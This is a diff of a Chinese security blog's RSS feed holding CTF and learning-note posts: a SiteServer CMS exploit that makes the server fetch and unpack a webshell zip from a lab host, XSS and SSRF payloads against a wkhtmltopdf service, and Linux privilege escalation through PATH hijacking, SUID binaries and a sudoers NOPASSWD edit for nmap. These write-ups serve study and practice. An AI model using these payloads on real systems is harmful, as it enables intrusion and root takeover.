+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pyDes&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;base64&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\x12\x34\x56\x78\x90\xAB\xCD\xEF&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;vEnfkn16t8aeaZKG3a4Gl9UUlzf4vgqU9xwh8ZV5&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;input_str&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.1.47/upload/image/poxteam.zip&amp;#34;&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;#encrypt&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;k&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;des&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;key&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;8&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CBC&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;iv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pad&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;None&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;padmode&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;PAD_PKCS5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;encrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;input_str&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64encode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;d&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0add0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0equals0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0and0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0question0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;0slash0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;
+
+&lt;span class=&#34;c1&#34;&gt;#decrypt&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;en&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;d&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0add0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;+&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0equals0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;=&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0and0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;amp;&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0question0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;?&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;replace&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0slash0&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;c1&#34;&gt;#en  = &amp;#34;ZjYIub/YxA2hc47NUFitAa/c/WMcuk7GQ4+P+eVq1v9u/TV3zrsdlbmZpWolkpKR&amp;#34;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;b64en&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;base64&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;en&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;t&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;k&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;decrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b64en&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;t&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;生成下载地址后，访问&lt;code&gt;http://10.10.1.234/SiteServer/Ajax/ajaxOtherService.aspx?type=SiteTemplateDownload&amp;amp;userKeyPrefix=test&amp;amp;downloadUrl=ZjYIub0slash0YxA050add0dg8BqV7gdwFQ0s7j1zKby8mrqRkGM9Zz0slash0XFNCCMuKIWwwj31AMn&amp;amp;directoryName=hello&lt;/code&gt;解压文件（默认的sectest目录无法使用，修改为其他目录名即可），返回&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;{&amp;quot;resultMessage&amp;quot;: &amp;quot;站点模板下载成功，请到站点模板管理中查看。&amp;quot;,&amp;quot;errorMessage&amp;quot;: &amp;quot;&amp;quot;}
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到文件已经成功上传并解压，访问&lt;code&gt;http://10.10.1.234/SiteFiles/SiteTemplates/hello/include.aspx&lt;/code&gt;输入密码admin进入管理页面&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210602222521.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;冰蝎🐎传上去死活连不了，msf也没有反弹成功。。。maybe是环境坏了吧（config怎么还被清空了呢？你玩尼玛呢，，，&lt;/p&gt;
+&lt;h2 id=&#34;未完成的网站unsolved&#34;&gt;未完成的网站|unsolved&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;还记得护网期间很熟悉的chrome rce嘛&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;url跳转&#34;&gt;url跳转&lt;/h3&gt;
+&lt;p&gt;功能点就只有两个：html转化pdf下载和联系表单，且联系表单处看着像存在反射型XSS，但是由于php文件无法访问导致我后面直接就把这个功能点忘了。。。&lt;/p&gt;
+&lt;p&gt;通过抓包发现pdf是通过wkhtmlpdf转化生成的&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210601175105.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;搜寻一番发现这个工具存在SSRF，尝试直接&lt;code&gt;file:///etc/passwd&lt;/code&gt;发现返回500，结合默认&lt;code&gt;/people/1&lt;/code&gt;猜想后端是&lt;code&gt;http://127.0.0.1+参数&lt;/code&gt;格式，那就需要通过url跳转来SSRF，但是fuzz过后发现没办法跳转到其他地址，@Leon师傅提示只能跳转本地（&lt;code&gt;127.0.0.1&lt;/code&gt;或&lt;code&gt;localhost&lt;/code&gt;）。端口fuzz太慢，也没什么可用的，猜一波，80和5000 get。接着就sb了，想不到访问本地80端口&lt;code&gt;test.php&lt;/code&gt;验证xss是否存在。不过后面考点还是挺脑洞（是我太菜了），谁能想到chrome RCE。。。&lt;/p&gt;
+&lt;h3 id=&#34;xss&#34;&gt;XSS&lt;/h3&gt;
+&lt;pre&gt;&lt;code&gt;/download?url=@localhost:80/test.php?name=12&amp;amp;email=12@12&amp;amp;message=11
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;下载pdf后发现name字段会插入html中，因此可以尝试XSS。&lt;/p&gt;
+&lt;p&gt;payload&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;/download?url=@localhost:80/test.php?name=&amp;lt;script&amp;gt;document.write(&#39;tyskill&#39;)&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;成功打印tyskill字符串（不过实际上打印了两遍，猜测是反射型打印了一次，转pdf又打印了一次）&lt;/p&gt;
+&lt;h3 id=&#34;chrome-rce&#34;&gt;chrome rce&lt;/h3&gt;
+&lt;p&gt;官方&amp;quot;粗糙&amp;quot;的wp中说从UA中可以发现使用的是chrome，然后联想到rce，河里，这很合理&lt;/p&gt;
+&lt;p&gt;获得UA&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;document&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;navigator&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userAgent&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;script&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210601175042.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;发现chrome，但是不出网，没办法通过访问&lt;code&gt;exp.html&lt;/code&gt;利用漏洞。只能通过js来利用了，shellcode咋改？嘤嘤嘤，菜鸡落泪&lt;/p&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/xiaozi/p/13022622.html&#34;&gt;使用msf入侵多层级网络架构&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://ha1c9on.top/2021/05/31/dozer-pentest-by-chun/&#34;&gt;Dozer 域渗透系列 By 春 预期&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://v2as.com/article/505a3c27-32a3-49b4-b6ae-5eea55330f1e&#34;&gt;BurpSuite多重代理的情形&lt;/a&gt;&lt;/p&gt;
+</description>
+                
+                
+                
+                
+                
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/categories/ctf/">CTF</category>
+                                
+                            
+                        
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</category>
+                                
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/xss/">XSS</category>
+                                
+                            
+                        
+                    
+                
+            </item>
+        
+            <item>
+                <title>[Linux提权]PATH提权</title>
+                <link>https://tyskill.github.io/posts/path%E6%8F%90%E6%9D%83/</link>
+                <guid isPermaLink="true">https://tyskill.github.io/posts/path%E6%8F%90%E6%9D%83/</guid>
+                <pubDate>Tue, 25 May 2021 00:00:00 &#43;0000</pubDate>
+                
+                    <author>tyskill@foxmail.com (tyskill)</author>
+                
+                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
+                
+                    <description>&lt;h2 id=&#34;前置知识&#34;&gt;前置知识&lt;/h2&gt;
+&lt;h3 id=&#34;linux环境变量&#34;&gt;Linux环境变量&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/youyoui/p/10680329.html&#34;&gt;Linux环境变量配置全攻略&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;path&#34;&gt;$PATH&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;$PATH&lt;/code&gt;是Linux和类Unix操作系统中的环境变量，它指定了存储所有可执行程序的&lt;code&gt;bin&lt;/code&gt;和&lt;code&gt;sbin&lt;/code&gt;目录，各目录之间用冒号&lt;code&gt;:&lt;/code&gt;隔开。当执行某个命令时，Linux 会依照 PATH 中的目录&lt;strong&gt;依次&lt;/strong&gt;搜寻该命令的可执行文件，找到就执行，不然就报错。此外，超级用户通常还具有&lt;code&gt;/sbin&lt;/code&gt;和&lt;code&gt;/usr/sbin&lt;/code&gt;目录，以便轻松执行系统管理命令。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;$PATH&lt;/code&gt;内容可通过&lt;code&gt;echo $PATH&lt;/code&gt;命令查看。&lt;/p&gt;
+&lt;h2 id=&#34;提权&#34;&gt;提权&lt;/h2&gt;
+&lt;p&gt;当我们将恶意二进制文件所在目录插入到PATH的第一个目录时，由于PATH提供了依次搜寻命令的目录地址，所以root执行命令就会优先执行我们插入目录下的二进制文件实现提权。&lt;/p&gt;
+&lt;p&gt;挑选一个目录&lt;code&gt;/tmp&lt;/code&gt;创建&lt;code&gt;test.c&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;#include&lt;/span&gt; &lt;span class=&#34;cpf&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+    &lt;span class=&#34;n&#34;&gt;setuid&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// root UID
+&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;ps&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;root用户编译并赋予suid属性&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gcc test.c -o shell
+chmod +s shell
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;回到低权限用户，创建ps文件，写入要执行的命令并赋予执行权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/sh&amp;#34;&lt;/span&gt; &amp;gt; ps
+chmod +x ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;最后插入PATH目录&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;PATH&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/tmp:&lt;span class=&#34;nv&#34;&gt;$PATH&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;执行&lt;code&gt;./shell&lt;/code&gt;成功提权&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210526171137.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;总结&#34;&gt;总结&lt;/h2&gt;
+&lt;p&gt;进行PATH提权的前提就是能进行suid提权，所以需要先使用payload寻找suid文件，然后读取文件内容看是否有非绝对路径的命令，如root直接运行&lt;code&gt;chmod&lt;/code&gt;等。&lt;/p&gt;
+&lt;h2 id=&#34;参考&#34;&gt;参考&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/2767&#34;&gt;Linux环境变量提权&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/youyoui/p/10680329.html&#34;&gt;Linux环境变量配置全攻略&lt;/a&gt;&lt;/p&gt;
+</description>
+                
+                
+                
+                
+                
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</category>
+                                
+                            
+                        
+                    
+                        
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/linux/">Linux</category>
+                                
+                            
+                                
+                                
+                                
+                                    <category domain="https://tyskill.github.io/tags/%E6%8F%90%E6%9D%83/">提权</category>
+                                
+                            
+                        
+                    
+                
+            </item>
         
             <item>
                 <title>美团CTF2021部分writeup</title>
@@ -1280,7 +1762,9 @@ find / -user root -perm -4000 -exec ls -ldb &lt;span class=&#34;o&#34;&gt;{}&lt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;类似这种&lt;a href=&#34;https://gtfobins.github.io/gtfobins/nmap/&#34;&gt;payload&lt;/a&gt;，使用sudo命令的用户生成的shell是root权限，换回普通用户就无了。那问题来了，都能sudo了为什么还要suid提权？&lt;a href=&#34;https://jlkl.github.io/2020/01/27/Web_15/&#34;&gt;Linux SUID 提权&lt;/a&gt;提到了一个文件&lt;code&gt;/etc/sudoers&lt;/code&gt;，该文件中有一个配置选项可以让用户通过sudo命令执行某些命令时不需要进行密码验证，因此如果在不知道用户密码的情况下无法正常使用sudo时刚好设置了nmap的无密码验证sudo执行，这时候就可以使用上面的payload成功提权了。&lt;/p&gt;
-&lt;p&gt;测试：&lt;code&gt;/etc/sudoers&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;测试：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/etc/sudoers&lt;/code&gt;&lt;/p&gt;
 &lt;pre&gt;&lt;code&gt;# Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;修改配置&lt;/p&gt;
@@ -1290,6 +1774,7 @@ tyskill	ALL=(root) NOPASSWD: /usr/bin/nmap
 &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时执行上面的payload，成功提权。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/tyskill/ImageHost@master/2021/20210513164237.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;p&gt;并且我发现执行&lt;code&gt;sudo -l&lt;/code&gt;时也不需要进行密码验证，之前还怀疑是不是由于sudo验证过了所以执行&lt;code&gt;sudo -l&lt;/code&gt;时不用验证，原来设置了这个之后执行&lt;code&gt;sudo -l&lt;/code&gt;就不需要验证了&lt;/p&gt;
+&lt;/blockquote&gt;
 &lt;h3 id=&#34;find&#34;&gt;find&lt;/h3&gt;
